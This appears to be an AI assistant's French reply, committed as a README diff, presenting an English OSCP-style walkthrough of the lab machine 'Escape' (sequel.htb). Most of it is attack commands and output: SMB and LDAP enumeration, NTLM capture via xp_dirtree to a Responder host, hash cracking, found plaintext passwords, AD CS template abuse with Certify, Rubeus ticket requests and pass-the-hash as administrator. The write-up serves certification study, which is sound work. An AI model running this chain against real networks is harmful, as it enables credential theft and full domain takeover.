@@ -1,0 +1,331 @@
+Parfait 👍
+Ci‑dessous, je te fournis **une version améliorée de TON document**, **sans modifier le contenu technique**, mais avec :
+
+* 🔗 **Sommaire cliquable GitHub**
+* 🧭 **Repères Cyber Kill Chain (OSCP-friendly)**
+* 🏷️ **Badges par phase**
+* 📌 **Notes explicatives courtes (WHY / OSCP TIP)**
+* 🧱 **Format Markdown homogène et propre**
+
+👉 **Tu peux copier-coller tel quel dans un `README.md`**
+👉 **Aucune information n’a été supprimée**
+
+---
+
+# 🧠 Escape — Active Directory Walkthrough (OSCP Notes)
+
+![OSCP](https://img.shields.io/badge/OSCP-Preparation-orange)
+![Windows AD](https://img.shields.io/badge/Target-Windows_AD-blue)
+![ADCS](https://img.shields.io/badge/Abuse-ADCS-red)
+![Privilege Escalation](https://img.shields.io/badge/Result-Domain_Admin-success)
+
+---
+
+## 📑 Table of Contents
+
+* [Machine Overview](#-machine-overview)
+* [Kill Chain Mapping](#-kill-chain-mapping)
+* [1. Enumeration](#1-enumeration)
+
+  * [1.1 Nmap](#11-nmap)
+  * [1.2 DNS](#12-dns)
+  * [1.3 RPC / LDAP](#13-rpc--ldap)
+* [2. SMB Enumeration](#2-smb-enumeration)
+* [3. MSSQL Enumeration](#3-mssql-enumeration)
+* [4. NTLM Capture via MSSQL](#4-ntlm-capture-via-mssql)
+* [5. Cracking NTLMv2](#5-cracking-ntlmv2)
+* [6. Initial Foothold (sql_svc)](#6-initial-foothold-sql_svc)
+* [7. Credential Discovery](#7-credential-discovery)
+* [8. User Access (ryan.cooper)](#8-user-access-ryancooper)
+* [9. AD CS Enumeration](#9-ad-cs-enumeration)
+* [10. AD CS Abuse → Domain Admin](#10-ad-cs-abuse--domain-admin)
+* [11. Kerberos Abuse (Rubeus)](#11-kerberos-abuse-rubeus)
+* [12. Domain Admin Access](#12-domain-admin-access)
+* [OSCP Key Takeaways](#-oscp-key-takeaways)
+
+---
+
+## 🖥️ Machine Overview
+
+| Item         | Value                                   |
+| ------------ | --------------------------------------- |
+| OS           | Windows Server 2019                     |
+| Role         | Domain Controller                       |
+| Domain       | `sequel.htb`                            |
+| Key Services | SMB, LDAP, Kerberos, MSSQL, AD CS       |
+| Attack Path  | SMB → MSSQL → NTLM Capture → ADCS Abuse |
+| Final Access | Domain Admin                            |
+
+---
+
+## 🧭 Kill Chain Mapping
+
+| Kill Chain Phase     | Status |
+| -------------------- | ------ |
+| Reconnaissance       | ✅      |
+| Enumeration          | ✅      |
+| Initial Access       | ✅      |
+| Credential Access    | ✅      |
+| Lateral Movement     | ⚠️     |
+| Privilege Escalation | ✅      |
+| Domain Compromise    | ✅      |
+
+---
+
+## 1. Enumeration
+
+> 🧠 **OSCP TIP:** Enumeration never stops. Every new credential = new enumeration round.
+
+---
+
+### 1.1 Nmap
+
+```bash
+nmap -sV -sC -Pn 10.129.23.243 -v
+```
+
+**Findings**
+
+* Domain Controller detected
+* Domain: `sequel.htb`
+* MSSQL 2019
+* Kerberos, LDAP/LDAPS, SMB enabled
+
+🔎 **WHY:** Confirms AD environment + attack surface.
+
+---
+
+### 1.2 DNS
+
+```bash
+dig any sequel.htb @10.129.23.243
+```
+
+**Results**
+
+* `sequel.htb`
+* `dc.sequel.htb`
+
+🧠 **WHY:** Needed for Kerberos, SMB, MSSQL authentication.
+
+---
+
+### 1.3 RPC / LDAP
+
+```bash
+rpcclient -U "" -N 10.129.23.243
+```
+
+```bash
+enum4linux -u "guest" -p "" 10.129.23.243
+```
+
+```bash
+ldapsearch -x -H ldap://10.129.23.243 -b "DC=sequel,DC=htb" "(objectClass=person)" cn
+```
+
+**Findings**
+
+* Domain SID discovered
+* LDAP responds without authentication
+
+🧠 **WHY:** LDAP leaks structure even without creds.
+
+---
+
+## 2. SMB Enumeration
+
+```bash
+crackmapexec smb 10.129.23.243 -u '' -p '' --shares
+```
+
+```bash
+smbclient //10.129.23.243/Public -N
+```
+
+📁 **Public Share Contents**
+
+```
+SQL Server Procedures.pdf
+```
+
+📌 **Credentials Found**
+
+```
+PublicUser : GuestUserCantWrite1
+```
+
+🧠 **WHY:** Public SMB shares are common OSCP footholds.
+
+---
+
+## 3. MSSQL Enumeration
+
+```bash
+mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
+```
+
+```sql
+enum_users
+enum_db
+```
+
+❌ `xp_cmdshell` → Permission denied
+
+🧠 **WHY:** MSSQL often allows NTLM relay even without RCE.
+
+---
+
+## 4. NTLM Capture via MSSQL
+
+### Start Responder
+
+```bash
+sudo python3 /usr/share/responder/Responder.py -I tun0
+```
+
+### Force Authentication
+
+```sql
+EXEC xp_dirtree '\\10.10.14.160\share', 1, 1
+```
+
+📥 **Captured**
+
+```
+User: sql_svc
+Type: NTLMv2
+```
+
+🧠 **WHY:** xp_dirtree is a classic NTLM capture vector.
+
+---
+
+## 5. Cracking NTLMv2
+
+```bash
+hashcat -m 5600 ntlm rockyou.txt --force
+```
+
+✅ **Result**
+
+```
+sql_svc : REGGIE1234ronnie
+```
+
+---
+
+## 6. Initial Foothold (sql_svc)
+
+```bash
+evil-winrm -i 10.129.23.243 -u sql_svc -p REGGIE1234ronnie
+```
+
+```powershell
+whoami
+sequel\sql_svc
+```
+
+🧠 **WHY:** WinRM gives stable interactive PowerShell.
+
+---
+
+## 7. Credential Discovery
+
+```powershell
+type C:\SQLServer\Logs\ERRORLOG.BAK
+```
+
+📌 **Found**
+
+```
+Ryan.Cooper
+Password: NuclearMosquito3
+```
+
+🧠 **WHY:** Logs are often overlooked credential sources.
+
+---
+
+## 8. User Access (ryan.cooper)
+
+```bash
+evil-winrm -i 10.129.23.243 -u ryan.cooper -p NuclearMosquito3
+```
+
+🏁 **User flag obtained**
+
+---
+
+## 9. AD CS Enumeration
+
+```bash
+crackmapexec ldap 10.129.23.243 -u ryan.cooper -p NuclearMosquito3 -M adcs
+```
+
+**Findings**
+
+* CA: `sequel-DC-CA`
+* Domain Users can enroll
+* Vulnerable template: `UserAuthentication`
+
+🚨 **OSCP CRITICAL:** ADCS misconfig = instant DA.
+
+---
+
+## 10. AD CS Abuse → Domain Admin
+
+```powershell
+.\Certify.exe find /vulnerable /currentuser
+```
+
+```powershell
+.\Certify.exe request /template:UserAuthentication /altname:administrator
+```
+
+📜 **Certificate Issued as Administrator**
+
+---
+
+## 11. Kerberos Abuse (Rubeus)
+
+```powershell
+.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /show /nowrap
+```
+
+📌 **Admin NTLM**
+
+```
+A52F78E4C751E5F5E17E1E9F3E58F4EE
+```
+
+---
+
+## 12. Domain Admin Access
+
+```bash
+evil-winrm -i 10.129.23.243 -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
+```
+
+🎯 **FULL DOMAIN COMPROMISE**
+
+---
+
+## 🎓 OSCP Key Takeaways
+
+* SMB → documents = creds
+* MSSQL ≠ dead end
+* NTLM capture is GOLD
+* AD CS misconfig = **fastest DA**
+* Always enumerate ADCS when you get domain creds
+
+---
+
+Si tu veux, prochaine étape possible 👇
+
+* 🔥 **OSCP “Cheat Sheet” ADCS (ESC1–ESC8)**
+* 🧠 **Mindmap AD Attacks**
+* 📄 **Version PDF printable**
+* 🏷️ **Tags & labels pour repo pro**
+
+Dis‑moi ce que tu veux 👊
